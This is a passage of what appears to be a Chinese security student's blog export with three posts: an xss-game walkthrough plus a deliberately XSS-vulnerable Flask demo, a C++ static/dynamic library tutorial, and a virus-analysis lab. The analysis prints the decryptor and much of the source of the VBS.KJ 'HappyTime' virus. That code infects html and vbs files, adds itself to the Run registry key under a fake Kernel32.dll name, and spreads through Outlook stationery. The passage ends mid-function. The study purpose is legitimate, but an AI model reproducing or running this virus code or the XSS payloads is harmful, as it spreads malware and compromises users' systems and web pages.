onerror='alert(\"madness\")'\u003e\n3\n在url搞事情，这边我自己没注意，它使用“”表示字符串，''表示标签里的字符串，没注意到卡了一会儿\nhttps://xss-game.appspot.com/level3/frame#1'/\u003e\u003cscript\u003ealert('Hello,XSS!');\u003c/script\u003e'\n4\n类似于一个计时器，但不过根据描述需要绕过，当然也就是在输入框搞事情了\njs动态引用参数问题\n输入3'可以看到 onload=\"startTime('3'');\"\n尝试输入3');alert('hello,XSS!\n5\n这个可太刺激了，我竟然没发现能看源代码，亏我按F12看代码，在N次尝试下猜实现\n输入转为链接过滤不严\n看源代码按下面的toggle\n构造如下：https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)\n6\n引入外部js，过滤不严导致绕过造成xss\n#后面能访问到url所指的地方，比如将其替换为baidu.com\n所以这边写个简易的javascript脚本\n1  alert(1);   然后保存\n用我们python3自带的简易服务器用于其url访问\n1  $ python -m http.server 8000   然后访问本地8000端口就可以看到本地文件了\n然后构造url：https://xss-game.appspot.com/level6/frame#HTTP://127.0.0.1:8000/temp.js\n注意，题目js源码中有对http的过滤\n当然也可以用google的jsapi：https://xss-game.appspot.com/level6/frame#hTTps://google.com/jsapi?callback=alert\n通关撒花\n最后通向了其XSS学习网站：https://www.google.com/about/appsecurity/learning/xss/index.html\n构造一个XSS网站以及其对抗 通过上面的靶场练习已经很熟悉XSS的原理了\n刚开始再用flask基本实现一个搜索功能时，发现无法XSS，后面经查询Flask和jinja2都有在传输时对数据进行html转义，但默认是Flask关闭html转义，jinja2开启html转义\n flask和其模板jinja2 禁用html转义\nhttps://blog.csdn.net/super_tiger_lee/article/details/77837443\nhttps://www.jianshu.com/p/6950b616f2b7\n简单来说，在使用变量 {{var}} 利用jinja管道的方法，对 var 变量进行信任，而不进行html转义，即写为 {{ var | safe }}\n 在前后台传输数据遇到的问题：\n 太久没写flask有点生疏，然后导致表单获取请求时一直为空，忘记啥原因了，这边mark一下\nget请求表单通过request.args.get('name')获得\npost请求表单通过request.form.get('name')获得\n  在评论时，防止get请求刷新后重复评论，需要用post去请求评论  实现html转义，有html包提供的方法，但代码里我们可以直接仿造其写一个(其实很简单)\n1 2 3 4  import html s = \"\u003cscript\u003ealert(1);\u003c/script\u003e\" tran_s = html.escape(s) ret = html.unescape(tran_s)   下面给出代码\n前端部分\n主要用jinja2模板写的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119  \u003c!DOCTYPE html\u003e \u003chtml\u003e\u003chead\u003e\u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003efuckXSS\u003c/title\u003e \u003cstyle type='text/css'\u003e div { display: block; } table { border-collapse: separate; border-spacing: 2px; } .message-container { padding: 10px; background-color: #F9F9F9; border: 1px solid #C4C4C4; border-radius: 5px 5px; width: 400px; font-size: 12px; } td { display: table-cell; vertical-align: inherit; } .shim { position: absolute; margin-left: -20px; top: 15px; height: 21px; width: 10px; } b { font-weight: bold; } blockquote { display: block; margin-block-start: 1em; margin-block-end: 1em; margin-inline-start: 40px; margin-inline-end: 40px; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1 style='text-align: center'\u003e 反射性XSS \u003c/h1\u003e \u003cdiv style='text-align: center; margin: 0 auto;'\u003e {% if query %} \u003cform action=\"/rxss\" method=\"GET\"\u003e \u003cinput type=\"text\" id=\"query\" name=\"query\" value=\"{{query}}\"\u003e \u003cbr\u003e anti-XSS\u003cinput type=\"checkbox\" name=\"anti-XSS\" value=\"1\"/\u003e \u003cbr\u003e \u003cinput id=\"button\" type=\"submit\" value=\"Search\"\u003e \u003c/form\u003e \u003cbr\u003eYour Search for {{ query|safe }}\u003cbr\u003e Unfortunately it has gone!\u003cbr\u003e {% else %} \u003cform action=\"/rxss\" method=\"GET\"\u003e \u003cinput type=\"text\" id=\"query\" name=\"query\" value=\"Enter query here...\"\u003e \u003cbr\u003e anti-XSS\u003cinput type=\"checkbox\" name=\"anti-XSS\" value=\"1\"/\u003e \u003cbr\u003e \u003cinput id=\"button\" type=\"submit\" value=\"Search\"\u003e \u003c/form\u003e {% endif %} \u003c/div\u003e \u003ch1 style='text-align: center'\u003e 持久性XSS \u003c/h1\u003e \u003cdiv style='text-align: center; margin: 0 auto;'\u003e \u003cform name=\"pxss\" action=\"pxss\" method=\"POST\"\u003e \u003cinput id=\"qcomment\" name=\"qcomment\" value=\"Enter comment here...\" onfocus=\"this.value=\u0026#39;\u0026#39;\"\u003e \u003cbr\u003e anti-XSS\u003cinput type=\"checkbox\" name=\"anti-XSS\" value=\"1\"/\u003e \u003cbr\u003e \u003cinput id=\"button\" type=\"submit\" value=\"Comment\"\u003e \u003c/form\u003e \u003c/div\u003e \u003cbr\u003e\u003cbr\u003e \u003cdiv id=\"post-container\" align=\"center\"\u003e \u003ctable class=\"message\"\u003e \u003ctbody\u003e\u003ctr\u003e \u003ctd valign=\"top\" class=\"message-container\"\u003e \u003cdiv class=\"shim\"\u003e\u003c/div\u003e \u003cb\u003eYou\u003c/b\u003e\u003cbr\u003e \u003cspan class=\"date\"\u003eSun Apr 12 2020 16:44:32 GMT+0800 (中国标准时间)\u003c/span\u003e \u003cblockquote\u003eWelcome!\u003cbr\u003e\u003cbr\u003eThis is your \u003ci\u003epersonal\u003c/i\u003e stream. You can post anything you want here, especially \u003cspan style=\"color: #f00ba7\"\u003emadness\u003c/span\u003e.\u003c/blockquote\u003e \u003c/td\u003e\u003c/tr\u003e {% if comment %} {% for comment_item in comment %} \u003ctr\u003e \u003ctd valign=\"top\" class=\"message-container\"\u003e \u003cdiv class=\"shim\"\u003e\u003c/div\u003e \u003cb\u003eYou\u003c/b\u003e\u003cbr\u003e \u003cblockquote\u003e\u003cp\u003e{{comment_item | safe}}\u003c/p\u003e\u003c/blockquote\u003e \u003c/td\u003e\u003c/tr\u003e {% endfor %} {% endif %} \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c/body\u003e\u003c/html\u003e   后端部分：\n通过Python的Flask实现\n通过路由来接收搜索和评论请求，把评论内容存储在一个数组里（毕竟是临时的，重启Flask应用即可清除评论）\nXSS的对抗将输入进行html编码实现，勾选框即可启用\nescape仿照了HTML包里面对于html编码的实现，利用python的字符串替代直接替换相关的html符号，实现html编码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  # !/usr/bin/env python # -*- coding: utf-8 -*- # # @time\t: 2020/04/12 # @Author\t:\tMagic # @File\t:\txss_test_server.py from flask import Flask,render_template,request,redirect,url_for app = Flask(__name__) comment = [] @app.route('/', methods=[\"GET\",\"POST\"]) def index(): return render_template(\"XSS.html\", comment=comment, query=None) # Realize the Reflected XSS attack Vulnerable Search box @app.route('/rxss', methods=[\"GET\",\"POST\"]) def rxss(): if request.method == \"GET\": qdata = request.args.get('query') action = request.args.get('anti-XSS') if not action: action = 0 print(request.args) if int(action): qdata = escape(qdata) print(qdata) return render_template(\"XSS.html\", query=qdata) # Realize the Persistent XSS attack Vulnerable Comment @app.route('/pxss', methods=[\"GET\",\"POST\"]) def pxss(): if request.method == \"POST\": qcomment = request.form.get('qcomment') action = request.form.get('anti-XSS') global comment if not action: action = 0 print(request.form) if int(action): qcomment = escape(qcomment) comment.append(qcomment) print(comment) #return render_template(\"XSS.html\", comment=comment) return redirect(url_for('index')) # 检查字符串是否含有标签并编码 def escape(s, quote=True): \"\"\" Replace special characters \"\u0026\", \"\u003c\" and \"\u003e\" to HTML-safe sequences. If the optional flag quote is true (the default), the quotation mark characters, both double quote (\") and single quote (') characters are also translated. \"\"\" s = s.replace(\"\u0026\", \"\u0026amp;\") # Must be done first! s = s.replace(\"\u003c\", \"\u0026lt;\") s = s.replace(\"\u003e\", \"\u0026gt;\") if quote: s = s.replace('\"', \"\u0026quot;\") s = s.replace('\\'', \"\u0026#x27;\") return s if __name__ == '__main__': app.run(debug=True, port=12345)   ","description":"","tags":["web","ctf"],"title":"XSS Attack","uri":"/posts/xss-attack/"},{"categories":["c++"],"content":"0x00 序  https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html\nhttps://zhuanlan.zhihu.com/p/32615811\nhttps://www.cnblogs.com/WindSun/p/11287927.html\n 在写关于病毒程序之前，忽然想学习一下有关C++库文件的编写\n库，是可复用代码的集合\n总所周知，库文件分为静态链接库和动态链接库，两者有一定的区别\n静态链接库在编译时，就通过链接成为可执行文件的一部分，简单来说，就是将库函数融入目标程序内，即使目标程序没有和库文件在一起也能运行；而动态链接库是在程序运行时调用的，其库并没有融入目标程序内，运行时可以随意加载和移除，节省内存空间。\n动态链接库和静态链接库的相同点是它们都实现了代码的共享，不同点是静态链接库文件中的代码被包含目标程序中，该lib中不能再包含其他动态链接或者静态链接的库了。而动态链接库可以被调用的目标程序动态地“引用”和“卸载”，一个动态链接库中可以包含其他动态链接库或者静态链接库。在大型的软件项目中一般要实现很多功能，如果把所有单独的功能写成一个个lib文件的话，程序运行的时候要占用很大的内存空间，导致运行缓慢；但是如果将功能写成dll文件，就可以在用到该功能的时候调用功能对应的dll文件，不用这个功能时将dll文件移除内存，这样可以节省内存空间。\n 在Win下，动态库以.dll结尾，静态库以.lib结尾。 在Linux下，动态库文件以.so结尾，静态库以.a结尾。 在Mac下，动态库以.dylib结尾，静态库以.a结尾。  Windows 静态库(.lib) libTest.h\n1 2 3 4  #ifndef _TEST_H #define _TEST_H int test_add(int x, int y); #endif   libTest.cpp\n1 2 3 4 5 6 7 8 9  #include \"libTest.h\"#include \u003ciostream\u003e//using namespace std;  int test_add(int x, int y){ int sum; sum = x + y; return sum; }   然后windows下需要配合VS命令行(我没内存卸了XD)，或者vs studio里面可以直接生成\n使用静态库也可在里面配置\n使用 main.cpp\n1 2 3 4 5 6 7 8 9 10 11 12  #include \"libTest.h\"#include \u003ciostream\u003eusing namespace std; #pragma comment(lib,\"libTest.lib\") //加入链接库  void main(){ int sum; sum = test_add(1, 2); cout \u003c\u003c sum \u003c\u003c endl; system(\"pause\"); }   动态库(.dll) dllGen.h\n1 2 3 4  #ifndef _MYADD_H #define _MYADD_H __declspec(dllexport) int test_add(int x, int y); #endif   注：导出函数的声明方式有两种，一种如上所示，另一种采用模块定义(.def)文件声明，具体上网搜\ndllGen.cpp\n1 2 3 4 5 6 7 8 9  #include \"dllGen.h\"#include \u003ciostream\u003eusing namespace std; int test_add(int x, int y){ int sum; sum = x + y; return sum; }   使用 main.cpp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  #include \u003ciostream\u003eusing namespace std; #include \u003cwindows.h\u003e //定义一个与myadd函数接受参数类型和返回 //值均相同的函数指针类型 typedef int(*lpAddFun)(int, int); int main(){ HINSTANCE hDll;//句柄 \tlpAddFun addFun;//函数指针 \thDll = LoadLibrary(\"dllGenTest.dll\");//动态加载DLL模块句柄 \tif (hDll == NULL){ FreeLibrary(hDll); } //addFun = (lpAddFun)GetProcAddress(hDll, \"myadd\"); //通过函数名获取函数的地址，没有运行 \taddFun = (lpAddFun)GetProcAddress(hDll, MAKEINTRESOURCE(1)); //通过函数的序号获取函数的地址，work \tif (addFun == NULL){ FreeLibrary(hDll); } int result; result = addFun(22,33); cout \u003c\u003c result \u003c\u003c endl; system(\"pause\"); FreeLibrary(hDll); return 0; }   Linux 静态库(.a) add.h\n1 2 3 4  #ifndef ADD_H #define ADD_H int add(int x,int y); #endif   add.c\n1 2 3 4 5 6  #include \u003cstdio.h\u003e#include \"add.h\"int add(int x, int y) { return (x + y); }   sub.h\n1 2 3 4  #ifndef _SUB_H_ #define _SUB_H_ int sub(int x, int y); #endif   sub.c\n1 2 3 4 5 6  #include \u003cstdio.h\u003e#include \"sub.h\"int sub(int x, int y) { return (x - y); }   main.c\n1 2 3 4 5 6 7 8 9 10 11 12  #include \u003cstdio.h\u003e#include \"sub.h\"#include \"add.h\" int main() { int a, b; a = add(1, 2); b = sub(10, 5); printf(\"a = % d, b = % d\\n\", a, b); return 0; }   不管是静态函数库还是动态函数库，都是由*.o目标文件生成。\n所以先复制代码\n1 2  $ gcc -c add.c $ gcc -c sub.c   生成add.o、 sub.o\n静态函数库由ar命令创建\n1  $ ar -crv libTest.a add.o sub.o    参数：\n-c create的意思\n-r replace的意思，表示当插入的模块名已经在库中存在，则替换同名的模块。如果若干模块中有一个模块在库中不存在，ar显示一个错误消息，并不替换其他同名模块。默认的情况下，新的成员增加在库的结尾处，可以使用其他任选项来改变增加的位置。\n 到此静态函数库创建完毕。\n使用方法 通过\n1  $ gcc -o main main.cpp -L. -lTest   编译main.c就会把静态函数库整合进main。\n 参数：\n-L 指定静态函数库的位置供查找，注意L后面还有'.'，表示静态函数库在本目录下查找。\n-l 则指定了静态函数库名，由于静态函数库的命名方式是lib*.a，**其中的lib和.a忽略。**\n 根据静态函数库的特性，此处删除libaddsub.a后main依然可以运行，因为静态库的内容已经整合进去了。\n动态库(.so) 直接用上面代码编译，选用gcc选项即可\n1  $ gcc -shared -fpic -o libTest.so add.cpp sub.cpp    参数\n-fpic：产生位置无关代码\n-shared：生成共享库\n 1  $ gcc -o out main.cpp -L. -lTest   此时还不能立即./out，因为在动态函数库使用时，会查找/usr/lib /lib目录下的动态函数库，而此时我们生成的库不在里边。\n这个时候有以下几种办法可以让他成功运行：\n  最直接最简单的方法就是把libaddsub.so拉到/usr/lib 或/lib中去。\n  还有一种方法,假设libTest.so在/home/linux/Test\n  export LD_LIBRARY_PATH=/home/linux/Test:$LD_LIBRARY_PATH\n 另外还可以在/etc/ld.so.conf文件里加入我们生成的库的目录，然后/sbin/ldconfig。   /etc/ld.so.conf是非常重要的一个目录，里面存放的是链接器和加载器搜索共享库时要检查的目录，默认是从/usr/lib /lib中读取的，所以想要顺利运行，我们也可以把我们库的目录加入到这个文件中并执行/sbin/ldconfig。\n  g++(gcc)编译选项\n  -c ： 仅编译源代码但不执行链接，输出结果为对象文件，即.o\n  -shared ：指定生成动态链接库。\n  -static ：指定生成静态链接库。\n  -fPIC ：表示编译为位置独立的代码，用于编译共享库。目标文件需要创建成位置无关码，念上就是在可执行程序装载它们的时候，它们可以放在可执行程序的内存里的任何地方。\n  -L. ：表示要连接的库所在的目录。\n  -l：指定链接时需要的动态库。编译器查找动态连接库时有隐含的命名规则，即在给出的名字前面加上lib，后面加上.a/.so来确定库的名称。\n  -Wall ：生成所有警告信息。\n  -ggdb ：此选项将尽可能的生成gdb的可以使用的调试信息。\n  -g ：编译器在编译的时候产生调试信息。\n  -c ：只激活预处理、编译和汇编,也就是把程序做成目标文件(.o文件)。\n  -Wl,options ：把参数(options)传递给链接器ld。如果options中间有逗号,就将options分成多个选项,然后传递给链接程序。\n    ldd命令可以查看一个可执行程序依赖的共享库**   ","description":"","tags":["c++"],"title":"Link-Library-of-C++","uri":"/posts/link-library-of-c-/"},{"categories":["reverse"],"content":"0x00 序 最近新型冠状病毒肆虐全球，然后我发现林老师的课紧随时事，上次刚了解完熔断，这次便来了病毒\n所谓计算机病毒，无非也就是一段程序，只不过这个程序是用来进行传播感染破坏而已，借用wiki中的定义，电脑病毒具有的不良特征有传播性、隐蔽性、感染性、潜伏性、可激发性、表现性或破坏性，通常表现两种以上所述的特征就可以认定该程序是病毒。\n计算机病毒的生命周期为开发期→传染期→潜伏期→发作期→发现期→消化期→消亡期\n 资料：\n计算机病毒-wiki\n About 病毒的来源\n浅谈二进制漏洞研究与病毒研究\n  计算机病毒的分类  木马病毒：比如rootkit，特洛伊木马 二进制病毒（即wiki中的有害软件）：比如蠕虫病毒，冲击波病毒，震荡波病毒 脚本病毒：比如宏病毒  病毒分析 然后应实验要求我们来做些病毒分析\n脚本病毒 所谓脚本病毒，就是用脚本语言设计的计算机病毒，流行的脚本语言比如javascript以及vbscript\nvbs  vbs基本语法\nvbScript_function\n msgbox \"strings\"：弹出对话框\n在IE11之后，不支持htm内嵌vbscript\nhappytime病毒  Github-amg1127 / virus_VBS-Haptime\n浅析欢乐时光（HAPPY TIME）病毒\n 之前是把病毒内嵌进入html中，当加载html时执行了vbscript脚本，类似于现在html自动执行javascript脚本\n大概病毒文件长下面这个样，由于密文过长就不粘贴了，然后通过execute执行解密函数\n加密的算法是先生成四个算子，每个字符减去对应的算子，解密时再按顺序加回来\n1 2 3 4 5 6 7 8 9  script language=vbscript\u003e document.write \"\u003cdiv style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'\u003e\u003c\"\u0026\"APPLET NAME=KJ\"\u0026\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\u0026\"activeX.Active\"\u0026\"XComponent\u003e\u003c/APPLET\u003e\u003c/div\u003e\" \u003c/script\u003e \u003cscript language=vbscript\u003e ExeString = \"Encrypto Strings\" Execute(\"Dim KeyArr(3),ThisText\"\u0026vbCrLf\u0026\"KeyArr(0) = 1\"\u0026vbCrLf\u0026\"KeyArr(1) = 3\"\u0026vbCrLf\u0026\"KeyArr(2) = 4\"\u0026vbCrLf\u0026\"KeyArr(3) = 8\"\u0026vbCrLf\u0026\"For i=1 To Len(ExeString)\"\u0026vbCrLf\u0026\"TempNum = Asc(Mid(ExeString,i,1))\"\u0026vbCrLf\u0026\"If TempNum = 18 Then\"\u0026vbCrLf\u0026\"TempNum = 34\"\u0026vbCrLf\u0026\"End If\"\u0026vbCrLf\u0026\"TempChar = Chr(TempNum + KeyArr(i Mod 4))\"\u0026vbCrLf\u0026\"If TempChar = Chr(28) Then\"\u0026vbCrLf\u0026\"TempChar = vbCr\"\u0026vbCrLf\u0026\"ElseIf TempChar = Chr(29) Then\"\u0026vbCrLf\u0026\"TempChar = vbLf\"\u0026vbCrLf\u0026\"End If\"\u0026vbCrLf\u0026\"ThisText = ThisText \u0026 TempChar\"\u0026vbCrLf\u0026\"Next\") 'Execute(ThisText) msgbox(ThisText) \u003c/script\u003e   如下图，插入msgbox可以查看代码\n发现老师给的源码和网上的略有不同\n以下是来自DanceFire对病毒源码的分析\n vbs常识：\n Sub func()：是对无返回值函数的声明 function func()：是对有返回值函数的声明 '：以'打头是在vbs的单行注释语句 Exit：后接for、do、function、Sub：指循环或函数的退出，相当于我们C中的循环的break和函数的return On Error Resume Next ：是vbs的错误处理语句，对错误进行提醒，然后继续运行程序 Set objectvar = {objectexpression | New classname | Nothing}：Set语句就是vbs中给变量赋值的语句 [Call] name [argumentlist]： Call语句，正如汇编中的call，用于函数的调用，argumentlist为传入函数的参数   #避免执行之 ' ccor ccor@263.net ' 发表于 2002-12-1 8:55:25 ' VBS.KJ[新欢乐时光病毒]源代码分析 ' Virus: VBS.KJ ' Analyze by DanceFire ( DanceFire@263.net ) ' 2002/7/10 ' Dim InWhere,HtmlText,VbsText,DegreeSign,AppleObject,FSO,WsShell,WinPath,SubE,FinalyDisk Sub KJ_start() ' 初始化变量 KJSetDim() ' 初始化环境 KJCreateMilieu() ' 感染本地或者共享上与html所在目录 KJLikeIt() ' 通过vbs感染Outlook邮件模板 KJCreateMail() ' 进行病毒传播 KJPropagate() End Sub ' 函数：KJAppendTo(FilePath,TypeStr) ' 功能：向指定类型的指定文件追加病毒 ' 参数： ' FilePath 指定文件路径 ' TypeStr 指定类型 Function KJAppendTo(FilePath,TypeStr) On Error Resume Next ' 以只读方式打开指定文件 Set ReadTemp = FSO.OpenTextFile(FilePath,1) ' 将文件内容读入到TmpStr变量中 TmpStr = ReadTemp.ReadAll ' 判断文件中是否存在\"KJ_start()\"字符串，若存在说明已经感染，退出函数； ' 若文件长度小于1，也退出函数。 If Instr(TmpStr,\"KJ_start()\") \u003c\u003e 0 Or Len(TmpStr) \u003c 1 Then ReadTemp.Close Exit Function End If ' 如果传过来的类型是\"htt\" ' 在文件头加上调用页面的时候加载KJ_start()函数; ' 在文件尾追加html版本的加密病毒体。 ' 如果是\"html\" ' 在文件尾追加调用页面的时候加载KJ_start()函数和html版本的病毒体; ' 如果是\"vbs\" ' 在文件尾追加vbs版本的病毒体 If TypeStr = \"htt\" Then ReadTemp.Close Set FileTemp = FSO.OpenTextFile(FilePath,2) FileTemp.Write \"\u003c\" \u0026 \"BODY onload=\"\"\" \u0026 \"vbscript:\" \u0026 \"KJ_start()\"\"\" \u0026 \"\u003e\" \u0026 vbCrLf \u0026 TmpStr \u0026 vbCrLf \u0026 HtmlText FileTemp.Close Set FAttrib = FSO.GetFile(FilePath) FAttrib.attributes = 34 Else ReadTemp.Close Set FileTemp = FSO.OpenTextFile(FilePath,8) If TypeStr = \"html\" Then FileTemp.Write vbCrLf \u0026 \"\u003c\" \u0026 \"HTML\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"BODY onload=\"\"\" \u0026 \"vbscript:\" \u0026 \"KJ_start()\"\"\" \u0026 \"\u003e\" \u0026 vbCrLf \u0026 HtmlText ElseIf TypeStr = \"vbs\" Then FileTemp.Write vbCrLf \u0026 VbsText End If FileTemp.Close End If End Function ' 函数：KJChangeSub(CurrentString,LastIndexChar) ' 功能：改变子目录以及盘符 ' 参数： ' CurrentString 当前目录 ' LastIndexChar 上一级目录在当前路径中的位置 Function KJChangeSub(CurrentString,LastIndexChar) ' 判断是否是根目录 If LastIndexChar = 0 Then ' 如果是根目录 ' 如果是C:\\，返回FinalyDisk盘，并将SubE置为0， ' 如果不是C:\\，返回将当前盘符递减1，并将SubE置为0 If Left(LCase(CurrentString),1) =\u003c LCase(\"c\") Then KJChangeSub = FinalyDisk \u0026 \":\\\" SubE = 0 Else KJChangeSub = Chr(Asc(Left(LCase(CurrentString),1)) - 1) \u0026 \":\\\" SubE = 0 End If Else ' 如果不是根目录，则返回上一级目录名称 KJChangeSub = Mid(CurrentString,1,LastIndexChar) End If End Function ' 函数：KJCreateMail() ' 功能：感染邮件部分 Function KJCreateMail() On Error Resume Next ' 如果当前执行文件是\"html\"的，就退出函数 If InWhere = \"html\" Then Exit Function End If ' 取系统盘的空白页的路径 ShareFile = Left(WinPath,3) \u0026 \"Program Files\\Common Files\\Microsoft Shared\\Stationery\\blank.htm\" ' 如果存在这个文件，就向其追加html的病毒体 ' 否则生成含有病毒体的这个文件 If (FSO.FileExists(ShareFile)) Then Call KJAppendTo(ShareFile,\"html\") Else Set FileTemp = FSO.OpenTextFile(ShareFile,2,true) FileTemp.Write \"\u003c\" \u0026 \"HTML\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"BODY onload=\"\"\" \u0026 \"vbscript:\" \u0026 \"KJ_start()\"\"\" \u0026 \"\u003e\" \u0026 vbCrLf \u0026 HtmlText FileTemp.Close End If ' 取得当前用户的ID和OutLook的版本 DefaultId = WsShell.RegRead(\"HKEY_CURRENT_USER\\Identities\\Default User ID\") OutLookVersion = WsShell.RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\MediaVer\") ' 激活信纸功能，并感染所有信纸 WsShell.RegWrite \"HKEY_CURRENT_USER\\Identities\\\"\u0026DefaultId\u0026\"\\Software\\Microsoft\\Outlook Express\\\"\u0026 Left(OutLookVersion,1) \u0026\".0\\Mail\\Compose Use Stationery\",1,\"REG_DWORD\" Call KJMailReg(\"HKEY_CURRENT_USER\\Identities\\\"\u0026DefaultId\u0026\"\\Software\\Microsoft\\Outlook Express\\\"\u0026 Left(OutLookVersion,1) \u0026\".0\\Mail\\Stationery Name\",ShareFile) Call KJMailReg(\"HKEY_CURRENT_USER\\Identities\\\"\u0026DefaultId\u0026\"\\Software\\Microsoft\\Outlook Express\\\"\u0026 Left(OutLookVersion,1) \u0026\".0\\Mail\\Wide Stationery Name\",ShareFile) WsShell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Outlook\\Options\\Mail\\EditorPreference\",131072,\"REG_DWORD\" Call KJMailReg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\",\"blank\") Call KJMailReg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\",\"blank\") WsShell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Outlook\\Options\\Mail\\EditorPreference\",131072,\"REG_DWORD\" Call KJMailReg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Common\\MailSettings\\NewStationery\",\"blank\") KJummageFolder(Left(WinPath,3) \u0026 \"Program Files\\Common Files\\Microsoft Shared\\Stationery\") End Function ' 函数:KJCreateMilieu() ' 功能：创建系统环境 Function KJCreateMilieu() On Error Resume Next TempPath = \"\" ' 判断操作系统是NT/2000还是9X If Not(FSO.FileExists(WinPath \u0026 \"WScript.exe\")) Then TempPath = \"system32\\\" End If ' 为了文件名起到迷惑性，并且不会与系统文件冲突。 ' 如果是NT/2000则启动文件为system\\Kernel32.dll ' 如果是9x启动文件则为system\\Kernel.dll If TempPath = \"system32\\\" Then StartUpFile = WinPath \u0026 \"SYSTEM\\Kernel32.dll\" Else StartUpFile = WinPath \u0026 \"SYSTEM\\Kernel.dll\" End If ' 添加Run值，添加刚才生成的启动文件路径 WsShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Kernel32\",StartUpFile ' 拷贝前期备份的文件到原来的目录 FSO.CopyFile WinPath \u0026 \"web\\kjwall.gif\",WinPath \u0026 \"web\\Folder.htt\" FSO.CopyFile WinPath \u0026 \"system32\\kjwall.gif\",WinPath \u0026 \"system32\\desktop.ini\" ' 向%windir%\\web\\Folder.htt追加病毒体 Call KJAppendTo(WinPath \u0026 \"web\\Folder.htt\",\"htt\") ' 改变dll的MIME头 ' 改变dll的默认图标 ' 改变dll的打开方式 WsShell.RegWrite \"HKEY_CLASSES_ROOT\\.dll\\\",\"dllfile\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\.dll\\Content Type\",\"application/x-msdownload\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllfile\\DefaultIcon\\\",WsShell.RegRead(\"HKEY_CLASSES_ROOT\\vxdfile\\DefaultIcon\\\") WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllfile\\ScriptEngine\\\",\"VBScript\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllFile\\Shell\\Open\\Command\\\",WinPath \u0026 TempPath \u0026 \"WScript.exe \"\"%1\"\" %*\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllFile\\ShellEx\\PropertySheetHandlers\\WSHProps\\\",\"{60254CA5-953B-11CF-8C96-00AA00B8708C}\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllFile\\ScriptHostEncode\\\",\"{85131631-480C-11D2-B1F9-00C04F86C324}\" ' 启动时加载的病毒文件中写入病毒体 Set FileTemp = FSO.OpenTextFile(StartUpFile,2,true) FileTemp.Write VbsText FileTemp.Close End Function ' 函数：KJLikeIt() ' 功能：针对html文件进行处理，如果访问的是本地的或者共享上的文件，将感染这个目录 Function KJLikeIt() ' 如果当前执行文件不是\"html\"的就退出程序 If InWhere \u003c\u003e \"html\" Then Exit Function End If ' 取得文档当前路径 ThisLocation = document.location ' 如果是本地或网上共享文件 If Left(ThisLocation, 4) = \"file\" Then ThisLocation = Mid(ThisLocation,9) ' 如果这个文件扩展名不为空，在ThisLocation中保存它的路径 If FSO.GetExtensionName(ThisLocation) \u003c\u003e \"\" then ThisLocation = Left(ThisLocation,Len(ThisLocation) - Len(FSO.GetFileName(ThisLocation))) End If ' 如果ThisLocation的长度大于3就尾追一个\"\\\" If Len(ThisLocation) \u003e 3 Then ThisLocation = ThisLocation \u0026 \"\\\" End If ' 感染这个目录 KJummageFolder(ThisLocation) End If End Function ' 函数：KJMailReg(RegStr,FileName) ' 功能：如果注册表指定键值不存在，则向指定位置写入指定文件名 ' 参数： ' RegStr 注册表指定键值 ' FileName 指定文件名 Function KJMailReg(RegStr,FileName) On Error Resume Next ' 如果注册表指定键值不存在，则向指定位置写入指定文件名 RegTempStr = WsShell.RegRead(RegStr) If RegTempStr = \"\" Then WsShell.RegWrite RegStr,FileName End If End Function ' 函数：KJOboSub(CurrentString) ' 功能：遍历并返回目录路径 ' 参数： ' CurrentString 当前目录 Function KJOboSub(CurrentString) SubE = 0 TestOut = 0 Do While True TestOut = TestOut + 1 If TestOut \u003e 28 Then CurrentString = FinalyDisk \u0026 \":\\\" Exit Do End If On Error Resume Next ' 取得当前目录的所有子目录，并且放到字典中 Set ThisFolder = FSO.GetFolder(CurrentString) Set DicSub = CreateObject(\"Scripting.Dictionary\") Set Folders = ThisFolder.SubFolders FolderCount = 0 For Each TempFolder in Folders FolderCount = FolderCount + 1 DicSub.add FolderCount, TempFolder.Name Next ' 如果没有子目录了，就调用KJChangeSub返回上一级目录或者更换盘符，并将SubE置1 If DicSub.Count = 0 Then LastIndexChar = InstrRev(CurrentString,\"\\\",Len(CurrentString)-1) SubString = 